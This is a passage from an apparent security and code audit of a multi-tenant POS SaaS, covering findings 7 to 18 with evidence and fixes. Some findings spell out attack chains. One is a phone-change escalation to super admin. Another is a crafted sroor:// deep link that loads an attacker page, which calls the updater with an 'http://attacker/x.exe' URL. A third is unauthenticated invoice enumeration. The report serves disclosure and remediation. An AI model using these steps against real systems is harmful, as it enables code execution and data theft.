- With `X-Tenant` set or a tenant host, `ResolveApiTenancy` calls `tenancy()->initialize()`. `ApiTokenAuth` then loads the user from the tenant DB through the Sanctum token.
- `App\Models\Tenant` extends stancl's `BaseTenant`, which uses the central connection. So `Tenant::findOrFail` in `SuperAdminApiController` (lines 139-271: toggleStatus, destroyTenant and others) acts on central tenants.

**Phone uniqueness is checked only in the tenant DB**
- `StoreUserRequest.php:20` uses `unique:users,phone`, which runs on the tenant connection. Its `authorize()` lets any tenant admin, or anyone with `users.manage` or `roles.manage`, create such a user.

**Worse than claimed**
- `UpdateProfileRequest.php:14` authorizes any logged-in user.
- Line 23 lets that user change their own phone, with uniqueness checked only in the tenant DB.
- So even a cashier can set their phone to `[REDACTED_PHONE]` and become platform super admin through PUT `/api/v1/profile`.
- The only blocker is a tenant DB that already holds that phone. In that case the existing account is itself a super admin. `TenantSampleSeeder.php:28` creates the owner with this phone and the seeded default password, and the history docs describe copying these accounts into tenant DBs.

**What I looked for and did not find**
- No middleware, policy or DB constraint in the code paths I traced checks that the user is a central user, or that the request runs without a tenant, before allowing super-admin abilities.

This is cross-tenant privilege escalation, so critical stands.

### 8. [CRITICAL] Electron: a deep-link tenant code can load any website, which then gets the full electronAPI bridge (remote code execution)
- **Location:** `D:\projects\sroor\desktop\main.js:42`
- **Effort:** M
- **Evidence:** parseTenantFromDeepLink (l.26-38) only lowercases and trims the `tenant`/`code` query value from sroor://. It then builds `https://${tenantCode}.baraa-solutions.com` (l.42, l.67) and calls mainWindow.loadURL(serverUrl + '/login'). It also saves that serverUrl permanently with settingsStore.set. A value such as `evil.com/` or `evil.com#` becomes https://evil.com/.baraa-solutions.com/login, so the host is evil.com. main.js never restricts navigation: the will-navigate handler at l.238-240 is empty and there is no setWindowOpenHandler. Every page loaded in mainWindow gets preload.js, which exposes updater.downloadAndInstall and saveSettings (preload.js l.32, l.40).
- **Impact:** One click on a crafted sroor://connect?tenant=... link (sent by email or WhatsApp, or placed on any web page) is enough. The POS window then loads an attacker page and keeps loading it on every restart, because the URL is persisted. That page can call electronAPI.updater.downloadAndInstall({downloadUrl:'http://attacker/x.exe'}), and the app silently runs that exe with /S (see the next finding). The attacker gets code execution on the cashier PC. Before that, the page can also phish tenant credentials.
- **Recommendation:** Check tenant codes against /^[a-z0-9-]{1,63}$/ before building any URL. Build URLs with the URL API and confirm hostname.endsWith('.baraa-solutions.com'), or that it is a domain the central resolver returned. Add will-navigate and setWindowOpenHandler guards that only allow the configured tenant origin and the central origin, and send anything else to shell.openExternal after an allow-list check. In every ipcMain.handle, check event.senderFrame.url against the allowed origin.
- **Verification:** I confirmed the whole chain in the code and found no guard anywhere along it.

1. **Deep-link parsing.** In D:\projects\sroor\desktop\main.js, parseTenantFromDeepLink (l.26-38) only checks the sroor:// prefix, then runs trim() and toLowerCase() on searchParams 'tenant' or 'code'. URLSearchParams decodes the value, so tenant=evil.com%2F becomes 'evil.com/'.
2. **URL building and loading.** applyDeepLinkTenant (l.42) and getTargetAppUrl (l.67) both build `https://${tenantCode}.baraa-solutions.com`. That gives https://evil.com/.baraa-solutions.com, whose host is evil.com; a '#', '?' or 'x@evil.com/' payload works the same way. Both paths store the value with settingsStore.set('serverUrl'), and settingsStore.js writes it to sroor-desktop-config.json, so it is persistent. On a warm start, l.47 runs mainWindow.loadURL(serverUrl + '/login'). On a cold start (process.argv), l.70 returns the URL and l.246 loads it.
3. **Persistence across restarts.** Later launches return the saved URL as-is at l.76-77, so the attacker page loads again every time.
4. **No navigation restriction.** The will-navigate handler at l.238-240 is empty (it never calls preventDefault). A grep of desktop/ finds no setWindowOpenHandler and no web-contents-created handler.
5. **Bridge exposed to any page.** mainWindow uses preload.js (l.149), and preload.js exposes the whole electronAPI to whatever origin is loaded, with no origin check. That includes saveSettings (l.32) and updater.downloadAndInstall (l.40).
6. **Update handler.** The ipcMain handler at l.539-542 also skips the sender/origin check. It passes the downloadUrl supplied by the page straight to nativeUpdater.downloadAndApplyUpdate.
7. **Download and install.** D:\projects\sroor\desktop\src\updater\nativeUpdater.js downloads that URL over http or https. It follows redirects, does no signature, hash or host check, and does not require https. It then runs spawn(updateExePath, ['/S'], {detached:true}) on win32. The file is fetched with Node http, so it probably gets no Mark-of-the-Web and SmartScreen likely won't prompt.

Two caveats lower the likelihood but do not stop the attack:
- The victim must click the link and usually accept the browser's "Open external app" prompt.
- The same bridge is also reachable through XSS on any legitimate tenant page, which makes the exposure wider than the finding states.

One click (plus a protocol prompt) gives persistent attacker content and silent arbitrary exe execution, so critical stands.

### 9. [HIGH] POS shipping/extra expenses and multi-payment splits are silently dropped by the server
- **Location:** `D:\projects\sroor\backend\resources\js\views\POS\PosView.vue:720`
- **Effort:** M
- **Evidence:** The payload sends `expenses: additionalExpenses.value` and `payments: multiPayments.value`. StoreSalesInvoiceRequest::rules() (app/Http/Requests/StoreSalesInvoiceRequest.php) declares `additional_expenses` but neither `expenses` nor `payments`. InvoiceController::store builds the DTO from `$request->validated()`, and CreateInvoiceDTO has no `payments` property. The InvoiceService S5 multi-payment branch (`!empty($data['payments'])`) therefore never runs from this endpoint.
- **Impact:** The POS screen shows a net total that includes shipping/services, but the saved invoice net excludes them. The receipt total differs from what the cashier collected. Split payments (cash plus InstaPay) are recorded as one Payment with the chip's method, which breaks treasury per-method reconciliation.
- **Recommendation:** Frontend: rename the key to `additional_expenses` and map the item shape the service expects. Backend (backend-architect): add `payments.*.amount|method` to the FormRequest and DTO, and validate that the sum of payments matches paid_amount. After submit, show the server's `net_total` from the response, not the client total.
- **Verification:** I confirmed this in the code. PosView.vue:707-724 posts `expenses: additionalExpenses.value` and `payments: multiPayments` to `api.post('/invoices')`. The axios baseURL is `/api/v1` (resources/js/Services/api.js:7), so the request reaches routes/api.php:105, which is InvoiceController::store. That method builds `CreateInvoiceDTO::fromArray($request->validated(), ...)` at InvoiceController.php:148. StoreSalesInvoiceRequest::rules() (lines 40-56) declares only `additional_expenses`. It declares neither `expenses` nor `payments`, so validated() drops both keys. Nothing remaps them: prepareForValidation only fills in a default customer_id, and no middleware merges `expenses` into the request. CreateInvoiceDTO has no `payments` property and toArray() does not output it. InvoiceService::confirmInvoice reads only `$data['additional_expenses']` (line 130), so customerExpensesTotal stays 0 and `netTotal = subtotal - discount` (line 184). For payment_type=cash the server sets paidAmount to that smaller netTotal. The S5 branch (`!empty($data['payments'])`, line 225) never runs. The fallback writes one Payment for the whole paid amount using `$data['payment_method']`, which is the chip method the POS sends. Meanwhile the client's cartNetTotal (PosView.vue:470-471) adds the expenses, so the cashier collects more than the saved invoice net. Split tenders are stored as a single method, which breaks per-method treasury figures. There is a correct path: StorePOSInvoiceRequest (lines 73-79, which accepts `expenses` and `payments`) plus POSInvoiceDTO (line 43, which maps `expenses` to additional_expenses). But that path is behind the web route `/pos/invoices` (tenant.php:84), and the SPA does not call it. The data loss is silent (no 422), happens on a core money path, and the saved invoice disagrees with the money collected, so high severity is justified. A related client-side issue: customerExpensesTotal in PosView counts every expense in the net total, including treasury-paid (`treasury_*`) ones. The server excludes those from the net even on the correct path.

### 10. [HIGH] Double-submit risk: F9 / Ctrl+Enter ignore isSubmitting and there is no idempotency key
- **Location:** `D:\projects\sroor\backend\resources\js\views\POS\PosView.vue:814`
- **Effort:** M
- **Evidence:** handleGlobalKeydown calls `submitInvoice(false)` when `!showSuccessModal && cart.length>0`, without checking isSubmitting. submitInvoice itself has no `if (isSubmitting.value) return` guard. Only the buttons are `:disabled`. The repo has no Idempotency-Key header or any idempotency handling (grep found nothing). api.js has `timeout: 30000`, and on error the cart is kept for a retry.
- **Impact:** Key auto-repeat, a double F9 press, or a retry after a timeout on a slow link (where the server already committed) creates duplicate invoices. Stock is deducted twice and treasury is inflated, and each duplicate then needs a manual cancellation.
- **Recommendation:** Guard submitInvoice at the top. Generate a client UUID per order (store it on the order object in usePosOrders) and send it as `Idempotency-Key` / `client_reference`. Backend: add a unique column and return the existing invoice on replay. Also ignore `e.repeat` in the keydown handler.
- **Verification:** I confirmed this in the code. In PosView.vue lines 814-818, handleGlobalKeydown runs submitInvoice(false) on F9 or Ctrl+Enter whenever `!showSuccessModal.value && cart.value.length > 0`. It checks neither isSubmitting nor e.repeat. submitInvoice (lines 700-743) only checks for an empty cart. It sets isSubmitting.value = true but never returns early when that flag is already true. The cart is cleared (clearActiveOrder) and the success modal is shown only after `await api.post('/invoices', ...)` resolves. So for the whole round trip, every further F9 or Ctrl+Enter keydown, including OS key auto-repeat on a held key, sends another POST with the same cart. The `:is-submitting` prop on lines 79-82 only disables the buttons. It does not block the window-level keydown listener. Services/api.js line 12 sets `timeout: 30000`. The catch block (lines 737-739) shows an error and keeps the cart, so the cashier can submit again even if the server already committed the invoice. On the server, I found no protection. A grep of backend/ (excluding vendor) for idempotency, request_id, client_uuid, dedup, Cache::lock and Cache::add found no idempotency or dedupe handling for invoice creation. The only hits were docs and skill references. Each duplicate POST is therefore a valid new invoice, with its own stock deduction and treasury entry. lockForUpdate prevents overselling but does not stop the duplicates. The double-press and auto-repeat cases are concrete and easy to trigger on a busy POS. The retry-after-timeout case is a general network risk. I kept severity at high because the result is duplicated financial and stock records that someone has to cancel by hand.

### 11. [HIGH] Thermal/A4 invoice print routes are unauthenticated on tenant domains (and centrally)
- **Location:** `D:\projects\sroor\backend\routes\tenant.php:60`
- **Effort:** M
- **Evidence:** Inside the group `['web', InitializeTenancyByDomain, PreventAccessFromCentralDomains]`, the routes `/invoices/{id}/print`, `/print/thermal` and `/print/a4` call `Invoice::with([...])->findOrFail($id)` with no `auth` middleware and no permission/store check. routes/web.php:56-65 repeats this with no middleware. The POS web fallback opens exactly this URL: `window.open(`/invoices/${id}/print`)` (PosView.vue:801). print-thermal.blade.php shows the customer balance by default (`thermal_show_customer_balance` defaults to true).
- **Impact:** Anyone who knows a tenant's domain can enumerate sequential invoice IDs and read customer names, phone numbers, amounts and balances. This is a PII and business-data leak within that tenant, and it ignores store isolation.
- **Recommendation:** Backend: put the print routes behind auth (a signed short-lived URL works for popups/Electron) and check `invoices.view` plus store scope. Frontend: open the SPA route `invoices.print` with `?autoprint=true`, or a signed URL returned by the API.
- **Verification:** I could not refute this finding. The code confirms it.

**The routes**
- In backend/routes/tenant.php, lines 60-74 define `/invoices/{id}/print`, `/print/thermal` and `/print/a4`.
- They sit inside the group `['web', InitializeTenancyByDomain, PreventAccessFromCentralDomains]`. They come before the `Route::middleware('auth')` group that starts at line 77, so they are outside it.
- Each route is a closure that runs `Invoice::with(['customer','items.item','additionalExpenses'])->findOrFail($id)`. There is no auth, no `can:` check, no store check and no policy.
- backend/routes/web.php lines 56-65 repeat the thermal and A4 routes with no middleware beyond the default `web` group.

**Guards I checked, none of which block access**
- The `web` group only appends StoreScope (bootstrap/app.php:19-21). StoreScope (app/Http/Middleware/StoreScope.php) does nothing unless `Auth::check()`, and it never blocks a request.
- The Invoice model (app/Models/Invoice.php) has only SoftDeletes. It has no global store scope and no tenant scope that depends on the logged-in user.
- TenancyServiceProvider::mapRoutes loads tenant.php inside `booted()`. Because tenant.php registers after web.php, its same-URI thermal/A4 routes replace the web.php ones. Either version is unauthenticated.

**Callers and leaked data**
- The POS opens exactly this URL: PosView.vue:801 calls `window.open(`/invoices/${id}/print`)`. InvoicesView.vue lines 193 and 217 do the same.
- print-thermal.blade.php:168 reads `Setting::getBool('thermal_show_customer_balance', true)`, so the balance shows by default. Lines 174-178 print the customer's `current_balance` (except for customer id 1). Line 95 prints the customer name.
- print-a4.blade.php:209-218 prints the customer's phone and address.
- IDs are sequential integers, so anyone who knows a tenant's domain can enumerate invoices without logging in. They get customer names, phones, addresses, balances, line items and totals, regardless of store.

**Two overstatements, neither of which changes the severity**
- The thermal receipt shows name and balance, not phone. Phone and address appear only on the A4 print.
- "Centrally": PreventAccessFromCentralDomains does not apply to the web.php copies. But on a central domain they would query the central DB, which probably has no tenant invoice data, so the real exposure is on tenant domains.

**Related, outside this finding:** web.php also exposes `/daily-journal/print`, `/items/{id}/movements/print`, the CSV exports and `/store/switch` without auth, so the same problem is wider than these three routes.

**Severity:** this is an unauthenticated PII and financial-data leak through enumerable IDs on a multi-tenant SaaS, so I am keeping it at high.

### 12. [HIGH] Plan or feature gating is not tenant-aware: FeatureGate is unused and useModules reads a static build-time JSON
- **Location:** `D:\projects\sroor\backend\resources\js\Composables\useModules.js:1`
- **Effort:** L
- **Evidence:** useModules imports '../config/modules.json' and returns mod.enabled from that file, so every tenant gets the same result. Components/FeatureGate.vue checks tenant.enabled_features and tenant.plan.features, but nothing imports it (grep finds 0 usages). isRouteEnabled is never called (0 usages), so the router guard (router/index.js:416-470) checks only superAdminOnly, meta.permission and meta.role, never module or plan.
- **Impact:** Super-admin plans and subscriptions have no effect on what a tenant sees. A cheaper plan exposes every module in the UI, and gating depends entirely on the backend enforcing plan limits. If the backend does not enforce them, the plans cannot be sold as tiers.
- **Recommendation:** Have the backend expose tenant plan features in /auth/me or the system context. Rewrite useModules to read appConfigStore.tenant.plan.features and fall back to modules.json only on single-tenant installs. Call isRouteEnabled in router.beforeEach, and wrap module entry points and premium actions in FeatureGate. Confirm with backend-architect that plan limits are enforced on the server.
- **Verification:** I confirmed this from the code, and the backend doesn't close the gap either.

Frontend:
- backend/resources/js/Composables/useModules.js:1 imports '../config/modules.json'.
- isModuleEnabled and isRouteEnabled return mod.enabled from that static file. Every module checked in modules.json is enabled: true. Nothing in the composable reads the tenant or plan.
- isModuleEnabled is used in DesktopSidebar.vue, MobileBottomNav.vue, SpaLayout.vue and useNavigation.js:280/285. So menu items are hidden only by the build-time JSON, the same for every tenant.
- isRouteEnabled has no callers.
- No file under resources/js imports FeatureGate.vue (grep -rln FeatureGate returns nothing). The only matches are inside FeatureGate.vue itself (lines 30-37, which read tenant.enabled_features and tenant.plan.features).
- The router.beforeEach guard (router/index.js ~415-470) checks requiresAuth, guestOnly, superAdminOnly, meta.permission and meta.role. It never checks a module, feature or plan.
- The only frontend code that reads tenant features is the super-admin editing UI (useSuperAdminTenantShow.js, useSuperAdminPlans.js, TenantFeaturesMatrixCard.vue).

Backend: the finding says impact depends on whether the backend enforces plans. It doesn't:
- Tenant::hasFeature (app/Models/Tenant.php:67), Plan::hasFeature (app/Models/Plan.php:56) and TenantFeatureManager exist.
- Grepping app/ and routes/ for calls to hasFeature, limit checks or feature middleware finds only the definitions, the interface binding and OverrideTenantFeatureAction (which writes overrides).
- app/Http/Middleware has only ApiTokenAuth, ResolveApiTenancy, StoreAccess and StoreScope. There is no plan or feature middleware.
- Tenant.php:106-108 has some usage-limit logic, but I found no evidence it is enforced on any route or action.

Result: plan features, manual overrides and limits currently have no effect on what a tenant can see or do, on either the frontend or the backend. For a product meant to be sold as a multi-tenant SaaS with plan tiers, high severity is justified. Note that this is a missing business control, not a data-isolation or security breach, so I'm not raising it to critical.

### 13. [HIGH] Delete-tenant and update-db-config actions have PHP parse errors, so these endpoints always return 500
- **Location:** `D:\projects\sroor\backend\app\Actions\Tenants\DeleteTenantAction.php:12`
- **Effort:** S
- **Evidence:** The file reads 'public function execute(Tenant ): void { DB::transaction(function () use () { ->domains()->delete(); ->delete(); }); }'. Every $tenant variable has been stripped. `php -l` reports a parse failure for this file and for app/Actions/Tenants/UpdateTenantDatabaseConfigAction.php. The SPA calls api.delete('/super-admin/tenants/{id}') from useSuperAdminTenants.js:186 and useSuperAdminTenantShow.js:198.
- **Impact:** The delete-tenant button in both super-admin screens always fails with a server error. The DB-config endpoint is broken too. When delete is fixed, note that it is a hard delete of a central record with no backup or grace period, and it does not drop the tenant DB.
- **Recommendation:** Restore the variables. Make delete a soft 'cancelled' status with an explicit, separately confirmed purge. Run `php -l` across app/ in CI.
- **Verification:** The finding holds. It is in the committed code (HEAD), not just local edits. In backend/app/Actions/Tenants/DeleteTenantAction.php:12-16 every $tenant variable is missing: `execute(Tenant ): void`, `use ()`, `->domains()->delete(); ->delete();`. backend/app/Actions/Tenants/UpdateTenantDatabaseConfigAction.php:11-26 has the same problem: `execute(Tenant , array )`, ` = [];`, `->update();`. Running `php -l` on each file gives "Parse error: syntax error, unexpected token" at line 12 and line 11. Both actions are wired up. routes/api.php:201-202 sends DELETE /tenants/{id} and POST /tenants/{id}/update-db-config to SuperAdminApiController::destroyTenant (line 247) and updateDatabaseConfig (line 268). Each method takes the broken action as a method-injected parameter, so Laravel loads the class before the method body runs. The resulting ParseError is thrown outside the controller's try/catch(Throwable), so both endpoints always return 500. The SPA calls the delete endpoint from Composables/useSuperAdminTenants.js:186 and useSuperAdminTenantShow.js:198. No SPA caller was found for update-db-config, so that break is backend/API only. One correction to the impact statement: the claim that a fixed delete "does not drop the tenant DB" is wrong. app/Providers/TenancyServiceProvider.php:39-44 maps TenantDeleted to a synchronous (shouldBeQueued(false)) DeleteDatabase job, and Tenant has no SoftDeletes. Once fixed, a delete would therefore hard-delete the central record and immediately drop the tenant database, with no backup or grace period. That is worse than the finding describes. Severity stays high: two super-admin tenant-management endpoints are fatally broken in committed code.

### 14. [HIGH] No server-side enforcement of suspended or expired subscriptions, and no UI for them
- **Location:** `D:\projects\sroor\backend\app\Http\Middleware\ResolveApiTenancy.php:33`
- **Effort:** M
- **Evidence:** ResolveApiTenancy initializes any tenant it finds and never checks status, subscription_ends_at or trial_ends_at. A grep for isSuspended, isExpired and subscription_ends_at shows the only check is in ResolveTenantWorkspaceAction:48, which runs on the resolve screen only. No middleware returns 402 or 403 for a lapsed plan. The SPA has no handler for 402 or plan-expired anywhere. api.js handles only 401, 403 (generic permission Swal) and 422.
- **Impact:** Suspending a tenant or letting its subscription lapse has no effect for devices already connected, because X-Tenant is cached in localStorage. The SaaS cannot stop non-paying customers, and those customers get no 'subscription expired, renew' screen.
- **Recommendation:** Backend: add tenant-status middleware that returns 402 with a code such as subscription_expired or tenant_suspended. Frontend: handle that code in api.js and route to a dedicated SubscriptionExpiredView with renewal and support contact details, translated in ar and en.
- **Verification:** The finding holds. I checked the code and found nothing else that blocks a suspended or lapsed tenant.

1. backend/app/Http/Middleware/ResolveApiTenancy.php:33-37 runs `Tenant::find()` and then `tenancy()->initialize($tenant)` straight away. It never reads status, subscription_ends_at or trial_ends_at. The subdomain/host branch at lines 57-69 has the same gap.

2. backend/bootstrap/app.php registers only the role, permission and store aliases, plus StoreScope on the web group. There is no subscription middleware, and backend/app/Http/Middleware contains only ApiTokenAuth, ResolveApiTenancy, StoreAccess and StoreScope.

3. ApiTokenAuth checks only the token and `user->is_active`. It never looks at the tenant.

4. In TenancyServiceProvider, the TenancyInitialized event has only BootstrapTenancy attached. No listener checks the subscription.

5. TenantFeatureManager checks plan features but never subscription validity.

6. routes/api.php:19 applies only ResolveApiTenancy, and the protected group at line 33 adds only ApiTokenAuth. Login, quick-login and workspace-users have no tenant status check either.

7. The only check is in ResolveTenantWorkspaceAction.php:48, and the SPA calls it only from WorkspaceConnectView.vue:54. Every later request sends X-Tenant from api.js:33, so the check is skipped completely. Hitting a tenant subdomain also skips it.

8. In the SPA, resources/js/Services/api.js handles only 401, 403 (a generic permission Swal) and 422. No code anywhere handles 402, suspended or expired. The router has no subscription guard.

There is also a secondary gap. `Tenant::isSuspended()` (Tenant.php:176-180) ignores an expired trial_ends_at, so a 'trial' tenant whose trial has ended is not flagged by the one existing check either.

Severity stays high. Suspension and plan expiry are the main controls of a paid SaaS, and today they are cosmetic: a tenant connected before suspension keeps full access. This does not expose data across tenants, so it is not critical.

### 15. [HIGH] Plan feature gating is not effective: FeatureGate is never used and useModules reads a static build-time JSON
- **Location:** `D:\projects\sroor\backend\resources\js\Composables\useModules.js:1`
- **Effort:** L
- **Evidence:** useModules imports ../config/modules.json, which has static enabled:true flags including coffee_blends, so it does not depend on the tenant's plan. A grep finds FeatureGate.vue referenced by no component. Tenant::hasFeature() is never called from middleware or controllers, and coffee-blender routes (api.php:162-163) are ungated. FeatureGate's fallback links to /super-admin/plans, which a tenant user cannot open; the router guard sends them back to the dashboard.
- **Impact:** Plans cannot be sold by feature tier because every tenant gets every module. Plan edits in the super-admin UI change nothing a tenant can see or do.
- **Recommendation:** Expose effective features in /system/context (they are already partly there via TenantResource plan and enabled_features). Make useModules compute from appConfig.tenant. Wrap nav items, routes (router meta.feature) and actions with FeatureGate. Enforce on the backend with a feature middleware. Replace the fallback link with a tenant-facing upgrade or contact screen.
- **Verification:** I checked this against the code and it holds.

1. **Module flags are static.** backend/resources/js/Composables/useModules.js imports ../config/modules.json, which is bundled at build time. `isModuleEnabled` and `isRouteEnabled` only read the static `enabled` flags. modules.json:95 has `coffee_blends` with every module set to `enabled: true`. Nothing in useModules reads tenant or plan data. This is what DesktopSidebar.vue:58/383, MobileBottomNav.vue:103-149 and useNavigation.js:280 use for gating.

2. **FeatureGate.vue is dead code.** backend/resources/js/Components/FeatureGate.vue does read `tenant.enabled_features` and `tenant.plan.features`. But a grep for "FeatureGate" or "feature-gate" across resources/js and app finds no import or use anywhere. Its upsell link at line 61 points to `/super-admin/plans`.

3. **No backend enforcement.**
   - `Tenant::hasFeature` (Models/Tenant.php:67) and `Plan::hasFeature` (Models/Plan.php:56) are never called outside their models.
   - TenantFeatureManager is used only by OverrideTenantFeatureAction, which is the super-admin action that writes the override. Nothing reads it to enforce access.
   - app/Http/Middleware has only ApiTokenAuth, ResolveApiTenancy, StoreAccess and StoreScope. None of them checks features or plans.
   - routes/api.php:162-163 (coffee-blender `calculate` and `invoice`) sit inside the plain `ApiTokenAuth` group from line 33, with no feature middleware.
   - The plan-limit helpers at Tenant.php:106-108 (users, stores, items) are not called from any Action or Controller, so plan limits are not enforced either.

No guard elsewhere makes up for this. Plan feature edits and per-tenant feature overrides in the super-admin panel are stored but have no effect on what a tenant sees or can do.

I'm keeping severity at high because the stated business goal is to sell plans by feature tier. This is a commercial and entitlement gap, not a cross-tenant data or security exposure.

### 16. [HIGH] Electron updater downloads and silently runs any URL the remote page supplies, over HTTP if asked, with no signature or hash check
- **Location:** `D:\projects\sroor\desktop\src\updater\nativeUpdater.js:98`
- **Effort:** M
- **Evidence:** main.js l.539-541 accepts `data.downloadUrl` straight from the renderer. downloadFile (l.11) uses http when the URL is not https and follows any redirect, including https to http (l.15-18). After the download it runs spawn(updateExePath, ['/S'], {detached:true}) (l.98) without verifying a hash or Authenticode signature. The server does compute apk_checksum: CreateAppVersionAction.php l.33 uses hash_file sha256 and CheckAppUpdateAction l.44 returns it. But AppUpdateController::checkVersion (l.43-60) leaves `checksum` out of the JSON, and neither client checks it. package.json has no win code-signing config.
- **Impact:** Any XSS on any tenant page, any compromised or lookalike serverUrl (see the deep-link and save-settings findings), or any proxy/MITM on an http redirect leads to silent installation of an arbitrary executable on POS machines. The machines of every tenant are exposed.
- **Recommendation:** Ignore renderer-supplied URLs. The main process should fetch the update manifest from a fixed HTTPS central origin, require HTTPS with no downgrade on redirect, compare SHA-256 to the manifest checksum (and expose `checksum` in AppUpdateController), and verify the Authenticode signer before spawning. Better still, switch to electron-updater with a signed publish config and a code-signing certificate.
- **Verification:** The finding is real. Every mechanical claim checks out in the code, but it needs an attacker foothold first, so I rate it high rather than critical.

What I confirmed:
- **No check on the URL or the sender:** `desktop/main.js:539-541` registers `ipcMain.handle('updater:download-and-install')`. It takes `data.downloadUrl` or `data.download_url` from the renderer. It does not validate the URL's scheme or host, and it does not check `event.senderFrame` origin.
- **Any loaded page can call it:** `desktop/preload.js:39-40` exposes it as `window.electronAPI.updater.downloadAndInstall`. The preload is attached to the main window (`main.js:149`), and that window loads remote tenant URLs.
- **Navigation is not restricted:** the `will-navigate` handler (`main.js:238-240`) is empty, so the bridge stays available on whatever page the window reaches.
- **Plain http and redirect downgrade:** in `nativeUpdater.js`, line 11 picks `http` for any URL that does not start with `https`. Lines 15-18 follow any 3xx `Location` header recursively, including a move from https to http.
- **The file is run without any check:** line 98 runs `spawn(updateExePath, ['/S'], {detached:true})`. There is no hash check, no Authenticode or signature check and no publisher check.
- **The server's checksum never reaches the client:** `CreateAppVersionAction.php:33` does compute `hash_file('sha256')`, and `CheckAppUpdateAction.php:44` returns `checksum`. But the `AppUpdateController::checkVersion` JSON at lines 43-60 leaves `checksum` out.
- **The web app passes the URL straight through:** `useAppUpdate.js:190-192` forwards `download_url` as it is.
- **No Windows signing config:** `desktop/package.json` has a win/nsis target but no signing configuration.

Supporting detail: deep-link parsing (`main.js:30-47, 64-70`) builds `https://${tenantCode}.baraa-solutions.com` and only applies trim and lowercase. A crafted `sroor://` tenant value could plausibly point the window at another host, which would then get the bridge. That supports the "lookalike serverUrl" path. I did not test this; the code alone suggests it.

Why I downgraded from critical to high: running the exploit needs a foothold first. That means XSS on a tenant page, a malicious deep link the user clicks, a malicious or changed `serverUrl` setting, or a MITM on an http hop. The default URL and the server-built URL are https. The updater is the missing last line of defence that turns any of those into silent arbitrary code execution on POS machines. That impact is severe, but the code does not let an attacker reach it with no help.

### 17. [HIGH] Android app can only reach tenant '2m': X-Tenant is overridden by host-based resolution
- **Location:** `D:\projects\sroor\backend\app\Http\Middleware\ResolveApiTenancy.php:46`
- **Effort:** M
- **Evidence:** capacitor.config.json hardcodes server.url to https://2m.baraa-solutions.com, so the WebView always runs on the 2m host. On native, WorkspaceConnectView.vue (l.82-90) stays on that host, stores tenant_id in localStorage and relies on the X-Tenant header. In ResolveApiTenancy, step 2 initializes the X-Tenant tenant but does not return. Step 3 then resolves the 2m host (not a central domain) and calls tenancy()->initialize() again with the 2m tenant (l.55-69). The appId com.sroor.cofe.erp and the Arabic 'coffee' appName are also fixed in the config.
- **Impact:** A tenant other than 2m that installs the APK and connects its workspace sees its own name in the UI, but every API call runs against 2m's database. Logins fail or hit the wrong tenant, so the mobile app is effectively single-tenant. This blocks selling the SaaS on Android and is a data-isolation hazard if user credentials happen to overlap.
- **Recommendation:** Backend change, for backend-architect: return early once X-Tenant initializes a tenant, or reject a mismatch between header and host. App side: point server.url to the central host (or bundle the SPA with webDir and no server.url) and resolve the tenant through workspace connect. Rename the appId/appName to generic branding before the first store release, because the appId cannot change later.
- **Verification:** I confirmed this from the code, and nothing else guards against it.

1. **The app is pinned to the 2m host.** `backend/capacitor.config.json` and the copy shipped in `backend/android/app/src/main/assets/capacitor.config.json` both set `server.url` to `https://2m.baraa-solutions.com`. Both also hardcode appId `com.sroor.cofe.erp` and the coffee appName.

2. **API calls stay on that host.** `resources/js/Services/api.js` uses a relative `baseURL` of `/api/v1`, so every call goes to the WebView host (2m). It sends `X-Tenant` from `localStorage.tenant_id`. `tenant_server_url` is written in `WorkspaceConnectView.vue` (line 65) but nothing in `resources/js` ever reads it back. On native, that view does `router.push('login')` and never changes host.

3. **The host overrides the header.** In `app/Http/Middleware/ResolveApiTenancy.php`:
   - Step 2 (lines 32-44) initializes the `X-Tenant` tenant and does not return.
   - Step 3 (lines 46-70) then checks the host. `2m.baraa-solutions.com` is not in `config/tenancy.php` `central_domains`, so it looks the host up by domain record, then by subdomain slug `2m`, and calls `tenancy()->initialize()` with that tenant.
   - In stancl v3, `vendor/stancl/tenancy/src/Tenancy.php` lines 43-50 end the current tenancy and switch whenever the tenant key differs. So the host-based 2m tenant replaces the `X-Tenant` one.

4. **No earlier guard.** The `api/v1` group in `routes/api.php` (line 19) applies only `ResolveApiTenancy`. Nothing in `bootstrap` initializes tenancy before it, and `routes/tenant.php` (InitializeTenancyByDomain) covers only the web routes.

**Result:** every Android API call runs against the 2m tenant database, whatever workspace the user connected to. The one condition is that a 2m tenant or domain row exists, which the hardcoded URL implies. Other tenants' logins fail, or authenticate against 2m's users if the credentials overlap. That is a real isolation hazard and blocks selling the SaaS on Android, so high severity is justified.

Browsers are not affected because there the host and `X-Tenant` agree. Electron uses its own `serverUrl` setting.

### 18. [HIGH] Android 'update' never downloads an APK: it fakes progress, reloads, and loops forever when the update is forced
- **Location:** `D:\projects\sroor\backend\resources\js\Composables\useAppUpdate.js:201`
- **Effort:** M
- **Evidence:** startDownloadAndInstall only has a real path for Electron (l.171). On Android it runs a setInterval with random progress increments (l.202-207). It then writes sroor_app_version_code to localStorage (nothing reads that key), shows 'installed successfully' (downloadStageText l.158) and calls window.location.reload(). Nothing navigates to download_url, so MainActivity's DownloadListener (which handles download-apk URLs) is never triggered. After the reload, CapacitorApp.getInfo() reports build 3 again.
- **Impact:** Android users are told the app was updated when it was not. If super-admin sets is_force_update or min_version_code, the modal has no close button (AppUpdateModal.vue l.64, l.174), and it reappears after every reload. This locks every Android POS out of the app.
- **Recommendation:** On Android, trigger the real download: navigate to latest.download_url, which MainActivity intercepts, or call a native plugin. Remove the simulated progress. Show real state only.
- **Verification:** I confirmed this from the code, and it is slightly worse than the finding says.

**What the update button does on Android**
- The modal mounted in App.vue (l.41/68) is `Components/AppUpdateModal.vue`. It uses `useAppUpdate()`, not the separate `useAppUpdater` / `Components/Common/AppUpdateModal.vue`, which App.vue never mounts.
- In `useAppUpdate.js`, `startDownloadAndInstall` has a real download path only for Electron, guarded by `isDesktopPlatform() && window.electronAPI?.updater` (l.171).
- Every other platform falls through to l.201-207: a `setInterval` that adds random progress, then a fixed 1.8s wait.
- It then writes `sroor_app_version_code` and `sroor_app_version_name` to localStorage (l.217, l.221). No other file under `resources/js` reads those keys.
- It sets `isDownloaded = true`, which shows the success state. Then `window.location.reload()` runs (l.240).
- Nothing ever uses `latestVersionData.download_url` outside the Electron branch, so `MainActivity`'s `DownloadListener` (l.32-40, which matches `download-apk` URLs and calls `downloadAndInstallApk`) is never reached.
- After the reload, `syncClientVersionInfo` reads the real build from `CapacitorApp.getInfo()`. `android/app/build.gradle` sets versionCode 3, so the app is back at build 3.

**Why a forced update locks the app**
- `closeModal` (l.252-261) does nothing while `isForceUpdate` is true, so the "app_update_dismissed" keys are never written.
